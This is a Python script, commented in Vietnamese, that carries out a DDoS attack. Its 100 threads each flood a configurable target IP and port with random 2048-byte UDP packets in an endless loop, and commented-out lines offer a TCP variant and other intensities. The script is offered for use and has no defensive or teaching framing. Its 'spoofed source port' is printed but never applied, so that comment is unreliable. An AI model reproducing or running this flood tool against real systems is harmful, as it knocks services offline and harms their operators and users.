import socket
import random
import threading
import time

# Thông tin mục tiêu
TARGET_IP = "192.168.1.20"  # Thay bằng địa chỉ IP của mục tiêu
TARGET_PORT = 5000          # Thay bằng cổng đang giám sát

# Hàm gửi gói tin giả mạo
def ddos_attack():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # UDP gói tin giả

            # sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # TCP
            # sock.connect((TARGET_IP, TARGET_PORT))
            # sock.send(bytes_to_send)


            # bytes_to_send = random._urandom(512)  # Gói tin nhỏ (512 bytes)
            # bytes_to_send = random._urandom(2048)  # Gói tin lớn (2048 bytes)
            bytes_to_send = random._urandom(2048)  # Kích thước gói tin



            spoofed_source_port = random.randint(1, 65535)  # Cổng nguồn giả mạo
            # spoofed_source_port = random.randint(1000, 2000)  # Chỉ định khoảng cổng nguồn


            sock.sendto(bytes_to_send, (TARGET_IP, TARGET_PORT))
            print(f"Gửi gói từ cổng {spoofed_source_port} đến {TARGET_IP}:{TARGET_PORT}")

            
        except Exception as e:
            print(f"Đã xảy ra lỗi: {e}")
        finally:
            sock.close()

# Chạy tấn công với nhiều luồng
def start_attack(num_threads=10):
    for i in range(num_threads):
        thread = threading.Thread(target=ddos_attack)
        thread.start()

if __name__ == "__main__":
    print("Tấn công DDoS đang bắt đầu...")
    start_attack(num_threads=100)  # Thay đổi số luồng (intensity của DDoS)
    # start_attack(num_threads=20)  # Tấn công với 20 luồng
    # start_attack(num_threads=100)  # Tấn công mạnh hơn với 100 luồng
